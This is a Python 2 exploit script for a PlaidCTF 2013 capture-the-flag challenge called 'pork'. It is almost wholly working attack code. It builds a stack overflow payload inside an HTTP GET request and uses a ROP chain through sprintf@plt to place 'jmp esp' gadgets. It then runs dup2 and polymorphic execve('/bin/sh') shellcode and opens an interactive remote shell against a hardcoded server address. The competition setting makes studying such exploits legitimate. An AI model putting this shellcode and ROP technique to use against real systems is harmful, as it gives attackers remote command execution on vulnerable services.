#!/usr/bin/python
#
# PlaidCTF 2013
# pwnable250 - pork (ASLR)
# danigargu @ w3b0n3s
#
# bad chars => \x00\x09\x0a\x0c\x20\x2f\x3a\x2f
#

import sys
import time
import socket
from struct import pack,unpack

p = lambda x : pack("<L", x)   # pack
u = lambda x : unpack("<L", x) # unpack

#ip = "127.0.0.1"
ip = "54.235.20.205"
port = 33227
socket_fd = 4

padding = "A"*1024
place = 0x0804acf8       # .data:0x0804acf8
valid_waddr = 0x08049ac2 # valid write addr for <vfprintf+18580>
sprintf_plt = 0x0804887c # sprintf@plt
pop3 = 0x080499a6        # pop esi ; pop edi ; pop ebp ; ret
pop2 = 0x080499a6+1      # pop edi ; pop ebp ; ret

# dup2(4,[0..2]) + polymorphic execve("/bin/sh") shellcode - 66 bytes
# http://hacktracking.blogspot.com.es/2012/12/polymorphic-shellcode-generator.html
shellcode = ("\x31\xc9\x31\xdb\xb3" + chr(socket_fd) + "\x6a"
             "\x3f\x58\xcd\x80\x41\x80\xf9\x03\x75\xf5"
             "\xeb\x10\x5e\x31\xc9\xb1\x1a\x80\x6c\x0e"
             "\xff\x1c\xfe\xc9\x75\xf7\xeb\x05\xe8\xeb"
             "\xff\xff\xff\x4d\xdc\xb5\xcc\x27\x6e\x84"
             "\x4b\x4b\x8f\x84\x84\x4b\x7e\x85\x8a\xa5"
             "\xff\x6e\xa5\xfe\x6f\xa5\xfd\xe9\x9c")

def get_connection(ip, port):
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((ip,port))
	return s

def interact_shell(s):
	while True:
		try:
			sys.stdout.write("$ ")
			sys.stdout.flush()
			c = sys.stdin.readline()
			s.send(c)
			time.sleep(2)
			sys.stdout.write(s.recv(4096))
		except KeyboardInterrupt, e:
			print " quit"
			s.close()
			break

def get_payload():
	payload = padding + p(pop3)
	payload += p(valid_waddr)*3
	payload += sprintf_sc_jumper()
	payload += shellcode
	return payload

def sprintf_sc_jumper():
	jmp_esp_addr = [0x8048852, 0x8048814] # \xff\xe4 (jmp esp)
	payload = ""

	# sprintf(char *str, const char *format, ...)
	for i in range(0,len(jmp_esp_addr)):
		payload += pack("<IIII", sprintf_plt, pop2, place + i, jmp_esp_addr[i]) # sprintf arguments

	payload += p(place)  # return to "jmp esp" address
	return	payload

# BOOOOM!! :-D
s = get_connection(ip,port)
s.send("GET http://" + get_payload() + " HTTP/1.0\n")
time.sleep(0.5)
s.send("\r\n")
interact_shell(s)
